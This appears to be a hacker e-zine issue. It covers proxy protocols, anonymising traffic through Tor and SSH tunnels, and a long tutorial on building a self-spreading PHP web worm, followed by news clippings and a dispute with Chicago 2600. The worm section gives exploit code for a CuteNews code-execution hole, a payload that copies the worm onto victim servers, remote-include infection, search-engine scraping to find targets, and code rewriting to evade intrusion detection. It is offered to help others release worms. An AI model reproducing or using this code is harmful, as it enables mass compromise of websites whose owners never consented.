A proxy is a piece of software that makes requests on behalf of a client to
remote resources. This article goes into short, practical summaries of several
prevelent proxy protocols available accross the internet. Authorization and
identification procedures are mostly ignored, since open proxies are so common
and to keep the article short and practical.

=== CGI Proxies ===
CGI proxies simply fetch web pages and occasionally FTP or other data based on
user-supplied input, which is usually just a GET variable. For example,
  http://foo.bar/p.php?url=http://www.hackthissite.org/
The reliability and transfer rates of these services are often quite high, and
can be easily strung together directly from the URL in many cases, like so:
  http://foo.bar/p.php?url=http://bar.foo/url.cgi?u=http://www.hackthissite.org/
Many language translators also function in this capacity, but unfortunately they
often send an X-Forwarded-For header identifying the sender's IP address.

=== HTTP Proxies ===
HTTP Proxies are pretty simple. The client sends a regular HTTP request to the
proxy server with an absolute URI. Therefore, what would normally be:
  GET / HTTP/1.1
  Host: www.hackthissite.org
    
when connecting directly to the hackthissite.org server becomes:
  GET http://www.hackthissite.org/
  Host: www.hackthissite.org
    
when connecting through a proxy. A blank line after the last header establishes
the end of the request (unless a Content-Length has been specified, as is
typical for a POST). The request then goes right on through as if the
destination had been directly connected to. Easy.

Unfortunately, some http proxies are configured to send certain personally
identifying information to the remote systems.
  * Transparent proxies send the client IP address in the X-Forwarded-For
    header and other headers affirming the use of a proxy server.
  * Anonymous proxies send out headers stating that the server is a proxy, but
    don't send out the client's IP address.
  * High anomnity, or "elite" proxies don't send out any information that
    identifies the service as a proxy to the destination.

=== HTTP CONNECT ===
Connect proxies were created as an extension to HTTP proxies as a means for
establishing persistent connections for protocols such as IRC. They are
relatively simple as well. For instance:
  CONNECT irc.hackthissite.org:6667 HTTP/1.1
    
will establish a connection to the HTS IRC server on port 6667. The server will
reply with an HTTP-formatted status message, and if the request was successful,
data can be sent and received freely. Because connect is an extention to the
HTTP protocol, adding extra lines like a Host or a User-Agent will work just
fine, but for most purposes is unnecessary.

=== SOCKS4 ===
Socks4a is an extension to the original socks4 to provide DNS lookup at the
proxy side. First, the client sends a request like so:
  * \x04 - socks4 version identifier
  * \x01 - command; 1 is connect
  * \x00\x50 - port expressed as 16 bit big endian: \x00\x50 would be port 80
      In Perl, pack("n", $port) will convert the integer $port to 16 bit big
      endian.
  * \xc0\xa8\x06\x47 - 4 bytes specifying the destination IPv4 address: the 4
      bytes shown would equate to 192.168.6.71. Use \x00\x00\x00\x01 if the
      proxy is to do the DNS lookup itself. (Any non-zero for the last octet
      will do.)
  * rawr\x00 - null-terminated USERID string, these are occasionally compared to
      IP addresses or IDENT replies as a primative form of authentication, but
      rarely. Most of the time this string is ignored, so put something random.
  * hackthissite.org\x00 - null-terminated domain name, just a null byte if a
      valid IP was provided earlier
The socks4 server then sends a reply like so:
  * \x00 - version of the reply code, should always be 0
  * \x5A - request granted
    OR \x5B - rejected or failed
    OR \x5C - rejected because can't connect to identd on the client
    OR \x5D - rejected because identd and the client report different IDs
  * \x00\x50 - destination port, ignore
  * \xc0\xa8\x06\x47 - destination IP, ignore
After these steps write directly to the socket as if the client was directly
connected.

=== SOCKS5 ===
Socks5 was developed to provide both UDP and TCP, strong authentication, DNS,
and IPv6 from the ground up. First off, the client sends a version
identifier/method selection message:
  * \x05 - socks5 version identifier
  * \x01 - number of methods to try; for our purposes, one will suffice
  * \x00 - methods; \x00 is no authentication required
The server will then reply:
  * \x05 - socks5 version identifier
  * \x00 - selected method; if this is \xff then the client must disconnect
If everything went well, the client then sends a socks5 request:
  * \x05 - socks5 version identifier
  * \x01 - command (\x01 for connect)
  * \x00 - reserved, leave null for now
  * \x01 - address type, \x01 for IPv4
    OR \x03 - for a domain name
    OR \x04 - for IPv6
  * \xc0\xa8\x06\x47 - 4 octets specifying the address for IPv4
    OR 16 octets for an IPv6 address
    OR 1 byte specifying the string length then the domain name for DNS
  * \x00\x50 - destination port, \x00\x50 is port 80
The server replies with:
  * \x05 - socks5 version
  * \x00 - reply field, \x00 for successful
    OR \x01 for general socks server failure
    OR \x02 for connection not allowed
    OR \x03 for network unreachable
    OR \x04 for host unreachable
    OR \x05 for connection refused
    OR \x06 for time to live expired
    OR \x07 for command not supported
    OR \x08 for address type not supported
    OR \x09 to \xff for unassigned
  * \x00 - reserved, always \x00
  * \x01 - address type, same values as in request
  * \xc0\xa8\x06\x47 - bound address
  * \x00\x50 - bound port, doesn't really matter for a connect request
Then the transaction continues as if the client were directly connected.  

=== Chains, Final Notes ===
For added anomnity, multiple proxies can be strung together in a process known
as chaining. In proxy chains, the client instructs proxy servers to connect to
subsequent proxy servers until the destination. This technique can greatly
improve anomnity, but may decrease throughput and increase latency.

Interestingly, Tor is nothing more than a socks4a proxy service as far as the
client is concerned, which brings in the possibility of using Tor conceptually
as just another link in a chain. Extending Tor exit nodes with open proxies
also opens up the possibility of getting around Tor restrictions on some
networks while maintaining encryption and anomnity, as it is much easier to
block Tor than to block the massive number of open proxies on the internet,
especially those on non-standard ports.

Reader, beware. Many proxies are run by phishers, over-zealous network
administrators, or law enforcement agencies that log everything. Always use more
than one layer of anomnity and never send unencrypted personally identifyable
information through public proxy servers.

[ tunnelling and tor ................................................ kuroishi ]
[------------------------------------------------------------------------------]

Tor is the Onion Routing Protocol, a project being developed by the Electronic
Freedom Frontier (EFF) for anonymity and privacy protection on the internet.  It
breaks up your packets and spreads them over the entire Tor network, encrypted,
to end points around the world, where they are reassembled and sent to their
intended destination.  Tor can be used to protect your identity when browsing
the web, chatting, or when doing super fun no-no stuffs ;D.

First, install Tor.  Tor is available from the EFF, at tor.eff.org.  Set it up
on your OS of choice.  You'll also probably want Privoxy, instructions on
configuring your HTTP Proxy (privoxy) to use a SOCKS proxy (tor), see the Tor
website.

To use Tor to anonymize your web browsing, open your browsers proxy settings.
If you're using both Tor and Privoxy you'll want to point your http proxy to
localhost, port 8118. If you're using Firefox, you'll want to check the box that
says "Use the same proxy for all protocols."  If you're not using Privoxy (just
Tor), set your SOCKS v4 proxy to localhost, port 9050.  Check if it's working by
going to http://whatismyip.com.  (a note for Firefox users: there is a handy
Firefox extension called ProxyButton.  It allows you to toggle your proxy on and
off quickly from your toolbar.  I recommend this extension if your doing serious
webhacking ;D)

You can set up other applications to route traffic through tor. Direct SOCKS
proxies through localhost port 9050.  But sometimes you may want to use Tor for
an application that does not have SOCKS support, that's where socat comes in
handy.  Socat is a useful tool for dealing with socket connections and tunnels.
I've written a quick script, called torbind to handle socat for us.

#!/bin/bash
# Usage: ./torbind [local port] [remote host] [remote port]
socat TCP4-LISTEN:$1,fork SOCKS4A:localhost:$2:$3,socksport=9050

Say we want to telnet to a remote host over tor.  Using socat we could do this:
	
$ ./torbind 1337 h4x3db0x0r.com 12345&; telnet localhost 1337
Connected to h4x3db0x0r.com port 12345.
Password?:
	
or IRC:
	
$ ./torbind 7000 irc.hackthissite.org 7000&; irssi
/server -ssl localhost 7000
	
You can route any port on local host to any port on any destination through tor.
You can figure out how to use this on your own ;D.

Say your hacking on the road.  You need to use a library or university computer
to do some serious buisness.  You can't install Tor due to certain restrictions,
or just due to time.  A nice quick n' dirty way of getting anonymous protection
is to use an SSH tunnel.  Any SSH client can route traffic through a SOCKS
tunnel to your ssh server.  If you have Tor and Privoxy running on your server
you can route your traffic out through that.  In Linux or MacOS just do for
example:

user@localhost $ ssh -L12345:localhost:8118 user@remotehost.com
Password:
user@remotehost.com $

Back at localhost you can now set your http proxies to localhost:12345.  This
will bounce traffic through your ssh session to your server, and out through Tor
for complete quick anonymity.

In windows, you can set up an SSH tunnel using PuTTY.

In PuTTY Config, under SSH, go to Tunnels and Add a new forwarded port, set
source port, like above something arbitrary, say 12345.  Destination should be
localhost:8118 (for Privoxy, without privoxy, use port 9050, for SOCKS.)  Now
connect to your SSH server, authenticate, and you should be able to set your
HTTP or SOCKS proxy to localhost, port 12345.

You also configure the unix command line ssh client to bounce through tor.
Install connect.c at /usr/local/bin/connect and add the following to your
ssh_config file. Alternatively, you can write shell scripts to automate the
process of alternating between tor ssh and non tor ssh.

Host *
ProxyCommand /usr/local/bin/connect -4 -S 127.0.0.1:9050 %h %p
(needs to have /usr/local/bin/connect )

sshtor.sh:
#!/bin/bash
cp /sw/etc/ssh/ssh_config.tor /sw/etc/ssh/ssh_config

sshnontor.sh:
#!/bin/bash
cp /sw/etc/ssh/ssh_config.nontor /sw/etc/ssh/ssh_config

                                !!!!!!!!!!!!!!!!
                                !!!  ACTION  !!!
                                !!!!!!!!!!!!!!!!

This article uses some specific examples from an unreleased web worm that would
spread itself through vulnerable php scripts. The worm is called World Cant Wait
and would post an announcement of the November 2nd Drive Out the Bush Regime
protests on thousands of message boards and blog engines. The original made use
of a private vulnerability but the techniques described here use the recently
disclosed php code execution vulnerability in CuteNews 1.4. We were playing
around with automating this exploit to find targets and replicate itself as a
programming exercise while we were toying with the idea of covertly releasing it
in the buildup to the protests to get people to the streets and give teeth to
the movement. In the end we decided that instead of risking legal complications
and trashing a bunch of systems, we would strengthen our movement by explaining
the techniques and release the code in modules to help arm future php worm
revolutionaries.

Although we left some intentional bugs and took portions of the code out, the
snippets below can be used to build a destructive worm. Recognize the
implications of getting involved with such actions and don't make ourselves into
the violent and destructive hackers the media tries to paint us as. The beauty
and genius of a worm is in writing the code itself, not how many systems it can
mess with. So let's get to it, and remember - coding is not a crime.

**** Automation ****
Find a vulnerability and write a self-automated target gathering and
exploitation engine. Web based vulnerabilities are predictable, can gather
targets through search engines fairly easily, and can be exploited automatically
by forging a series of HTTP requests.

while ($stop == false) {
  $list = gather_targets();
  for ($i=0;$i<count($list);$i++) {
    echo " [x] targetting $list[$i]...\n";
    if (!is_infected($list[$i])) infect($list[$i]);
  }
  $stop = true;
}

In order to have a web based worm spread, you need to automate the exploitation
process. This can be done by using PHP's socket functions to establish
connections to the web server and sending http data. This function demonstrates
how a PHP script can connect to a server, send data, and return the response:

function make_request($domain, $packet) {
  $fp = @fsockopen($domain, 80, $errno, $errstr, 10);
  if (!$fp) return false;
  fwrite($fp, $packet);
  while (!feof($fp)) $text.= fgets($fp);
  fclose($fp);
}

Then it is just a matter of forging a proper HTTP request which will exploit the
vulnerability and get it to run a copy of itself on the infected system.
CuteNews writes information to data/flood.db.php when someone posts comments to
a news article. You can insert PHP code to this file by passing data in the
Client-Ip HTTP header.

$packet = str_replace("\n","\n\r", 
"POST
$location/example2.php?subaction=showcomments&id=1128188313&archive=&start_from=
&ucat=& HTTP/1.1
Accept: */*\r\nAccept-Language: en
Accept-Encoding: gzip, deflate
Client-Ip: <?php echo \"arbitrary php code to be executed!!\"; ?>
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/412.6
(KHTML, like Gecko) Safari/412.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Connection: close
Host: $domain

name=haxitup&mail=&comments=j00+haxed+%3Alaughing%3A&submit=Add+My+Comment&
subaction=addcomment&ucat=&show=

";

If we make a couple of these requests, it will write the PHP code from Client-IP
to flood.db.php. Then we can call flood.php from a standard GET request to
execute the code. Now that we can automate the process of executing PHP code on
a given server, we can start thinking about some code that will replicate the
worm as well as delivering our payload. This example will copy the entire worm
code to 'sekret.php' on the vulnerable server, ready to be run. You can add any
payload at the end of Client-Ip, from running sekret.php to adding a line at the
top of news.txt which will make a news post on every vulnerable CuteNews site ;)
;)

$source = str_replace("\$", "\\\$",str_replace("\"", "\\\"",str_replace("\\",
"\\\\",file_get_contents($_SERVER['PHP_SELF']))));
...
Client-Ip: <?php \$fp=fopen(\"sekret.php\", \"w\");fwrite(\$fp,
\"$source\");fclose(\$fp); ?>\r\n ...
...
for ($i=0;$i<2;$i++) { $bob = make_request($domain, $packet); }
make_request($domain, "GET $location/data/flood.db.php HTTP/1.1\r\nHost:
$domain\r\nConnection: close\r\n\r\n");

Other Infection Method: PHP Inclusion
It is not difficult to automate the process of PHP include related
vulnerabilities either. Poorly written PHP scripts commonly have bits of code
similar to <?php include $page; ?>, which is vulnerable in many situations to
remote PHP code execution by passing the URL to a bit of PHP code as the GET
variable 'page'. Our worm can copy itself to some place on the web root and pass
the URL to an HTTP GET request to execute itself on another server.

$fp = fopen("sekret.txt", "w");
fwrite($fp, file_get_contents($_SERVER['PHP_SELF']));
fclose($fp);
$url = $_SERVER['SCRIPT_URI'];
make_request($domain, "GET /test.php?path=$url HTTP/1.1\r\nHost:
$domain\r\nConnection: close\r\n\r\n");

Other Infection Method: SQL
Other Infection Method: JavaScript / XSS

**** 3. Target Gathering ****

During the development of the worm, it would be wise to seperate the actual
exploit code from the target gathering code. Test on your own machine or on a
LAN using code similar to:

function gather_targets() {
  return array("http://localhost/cutenews");
}

For the purposes of web based worms, it makes sense to use search engines in
order to extract potential targets. You can easily write a few queries that will
produce URLs to sites running specific software. This can be automated through
page scraping code to generate an array of targets which can be passed to your
worm for infection.

  $search = array("inurl:flood.db.php", "\"powered by cutenews v1.3\"",
"\"/cutenews/remote_headlines.php\"", "\"powered by CuteNews\" \"2003..2005
CutePHP\"",  "inurl:\"/newsarchive.php?archive\"");
  $query = $search[rand(0, count($search)-1)];
  
You can scrape results from major search engines by making HTTP requests and
looking at the returned URLs.

  $fp = fsockopen("google.com", "80");
  fwrite($fp, "GET /search?q=" . urlencode($query) .
"&sourceid=mozilla-search&start=0&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls
=org.mozilla:en-US:official HTTP/1.1\r\n
Host: www.google.com\r\n
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)
Gecko/20050511/1.0.4\r\n
Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
image/png,*/*;q=0.5\r\n
Accept-Language: en-us,en;q=0.5\r\n
Accept-Encoding: gzip,deflate\r\n
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n
Connection: close\r\n\r\n");
  while (!feof($fp) AND (strpos($text, "2005 Google") === false)) {
    $text.= fgets($fp);
  }
  fclose($fp);
  
  while (!(strpos($text, "<a href=\"http://") === false)) {
    $starttext = substr($text, strpos($text, "<a href=\"http://") + 9);
    $thenumber = substr($starttext, 0, strpos($starttext, "\""));
    $text = str_replace("<a href=\"$thenumber\">", "x", $text);   
    if (strpos($thenumber, "google") === false) $vuln[] = $thenumber;
  }  
  print_r($vuln);

**** Evading IDS, Polymorphism, and Communication ****
You can adjust the source of the program on the fly by making several find and
replaces in the code for each new iteration of the worm. PHP and other languages
have several function aliases that can be swapped to produce the same results.
Consider adding extroneous PHP code as trash to confuse file sizes and coding
similarities. In addition to changing the names of variables in the program, you
can also express values of numbers and strings in different ways. 

$random++;              ->        $random+= -2 + 3;
$start = "go";          ->        $start = chr(103) . chr(111);
$num = count($result);  ->        $num = sizeof($result);

The following bit of code published in 29a rewrites the source using new
variable names.

<?php
$changevars=array('changevars', 'content', 'newvars', 'counti','countj',
'trash');
srand((double)microtime()*1000000);
$content=fread(fopen(__FILE__,'r'),filesize(__FILE__));
$counti=0;
while($changevars[$counti]) {
  $content=str_replace($changevars[++$counti], trash('',0), $content);
}
fwrite(fopen(__FILE__,'w'),$content);

function trash($newvar, $countj) {
  do { $newvar.=chr(rand(97,122)); } while (++$countj<rand(5,15));
  return $newvar;
}
?>

Randomizing data sent in the http request, making it less predictable. You can
include and choose a random user-agent making it look like real users. Or you
can adjust the actual POST data so that they aren't all using the same values
for each form name (like the above cutenews example). 

If your worm depends on a search engine like google to gather targets, it might
be worth considering diversifying your queries as to reduce the chances of being
blacklisted and killing the worm. inurl might find a lot of pages, but intitle
works as well. Consider randomizing the user-agent of your http requests or
integrating multiple search engine support to keep them confused and extend the
duration of the worm.

Develop methods of communicating with past and future iterations of the worm,
feeding it locations of attacked boxes. A decentralized method of interworm
communication can also help the worm adapt itself by discovering(fuzzing) new
exploits or being fed new attack vectors. 

**** Final Words ****
World Cant Wait was developed as a simple proof-of-concept in the world of
writing web based worms that spread through vulnerable php scripts. Although the
worm code was not designed to trash systems (the above code won't even work
without some modification) the concepts can be used to deliver all sorts of
payloads. Script kiddie worms have in the past been used to gather jumpboxes,
harvest passwords, or ddos major systems, while others have actually went and
patched the security hole of the vulnerable software. Others are toying with the
idea of making mass amounts of posts on guestbooks, blogs, and message boards to
google bomb and manipulate google and other spidering systems. The possibilities
are endless, and the real genius is in creativity. 

Most people interested in advanced coding exercises such as writing worms are
motivated by the challenge of actually developing efficient code to automate the
art of gathering targets and exploiting them. There is no greater and more
beautiful coding exercise for efficiency and complexity than coding a worm. Even
if writing code can be considered a criminal act in the eyes of the state,
interest in this beautiful art has been around for decades and will always
remain a part of hacker culture as long as we are able to develop them in a
secure and responsible way.

"France's Youth Battles Also Waged on the Web"
Washington Post, November 10, 2005

While riot police are attempting to curb the gangs that have been setting fire
to cars and buildings in France's poor suburban communities for the past two
weeks, French officials have only just begun the struggle to control a more
amorphous battleground: cyberspace.

Internet blogs have become so vicious and intense that police have opened
investigations against two teenagers for inciting violence on radio
station-sponsored blogs. Hackers took over the Web site of the northern Paris
suburb of Clichy-sous-Bois, where the first violence began Oct. 27, and
dispatched thousands of fake e-mails announcing the mayor's resignation. Local
gangs have used text messaging on their cell phones as early warning systems to
alert members about the movements of riot police during operations in their
communities, gang members said in interviews.

"CTA asks feds to probe e-mail hoax"
Chicago Tribune, December 14th 2004

The Chicago Transit Authority today asked the FBI to investigate an e-mail sent
to media outlets early this morning, falsely announcing free CTA rides to the
public on Wednesday. 

The so-called press release went out under CTA President Frank Kruesi's name and
was received by the Tribune and other news media at 3 a.m. It apologizes for
pending service cuts, and "in the spirit of the holidays" announces "One Day of
Free Travel" on buses and trains beginning 5 a.m. Wednesday.

Nothing could be further from the truth, officials of the transit agency said
today. "It's phony, and we have referred it to the FBI," said CTA spokeswoman
Noelle Gaffney. The e-mail, headlined "Riders Don't Pay, Workers Don't Collect!"
did not originate with the CTA, and there will be no fare holiday, officials
said.

[ black and white chicago 2600 ............................................... ]
[------------------------------------------------------------------------------]

After an invitation to test the security of several of their systems we
proceeded to root each of them and showed them how it was done because at the
time they were curious and interested as to how their systems were compromised.
After Jeremy's place was raided by the FBI, the white hats got scared and showed
their true colors, starting to call us 'cyber-criminals' and 'electronic
vandals' and started to work with the FBI and ProtestWarrior to demonize,
harass, and incriminate members of our group. By aiding the forces that work to
destroy the hacking movement, Chicago "2600" has lost all credibility as a
public hacking group. 

Over a period of months, several self-appointed Chicago 2600 administrators have
acted in ways which endanger other hackers, abuse their power, and otherwise
undermine the spirit of hacking in general.

* Turned over logs and other information to narc to people's bosses with the
successful intent to get people fired.
* Has worked with law enforcement to provide testimony and freelance
surveillance to aid the FBI's chances of conviction as well as work with
right-wing group ProtestWarrior to do counter-intelligence and public smear
campaigns 
* Repeatedly censor and prevent people from posting to the public email list
when they don't agree with the posts or want to hide some of the stuff they're
doing.
* Run a secret email list for those who "make the real decisions about the
group", which they have used to badmouth and conspire against other members
* Moved meetings to a private location where they have banned several people
with threats of going to the police

When approached about these violations, the administrators maintain that "this
is not a democracy" and that they can run their "private company" any way they
choose. In addition to breaking a number of 2600 conventions, this sort of
egotistical, authoritative philosophy undermines the open democratic spirit of
hacking.

Like many other hacking groups, 2600 has counter-culture roots and has always
embraced dissenting opinions. 2600 has also recognized that hacking is
inherantly political, and how free technology can be used to defend digital
rights and free speech. The Fifth HOPE was held in NYC a month before the
Republican National Convention came to town and had a number of political
presentations covering independent media, the free software movement, and even a
speech talking about civil disobedience at the upcoming RNC protests.

2600 has created a set of national guidelines in order to keep local groups
organized around the principles of freedom and democracy and to prevent
power-hungry administrators to abuse the rest of the group. 

"Remember that meetings are open to all as per the meeting guidelines. Your
meeting CANNOT be "sponsored" by anyone or it's not a 2600 meeting. Also, avoid
appearing to be a tight knit group as this will only discourage or intimidate
new attendees. It also would be inaccurate - meetings are no more yours than
they are anybody else's. Similarly, your site should only focus on the meeting
itself, not activities outside of or after the meeting. If you imply that all of
the cool people wind up doing one thing while the non-cool people do something
else, you're creating divisions and factions that have no place here. For the
same reason, we strongly discourage any kind of content that mocks or puts down
any attendee(s)."
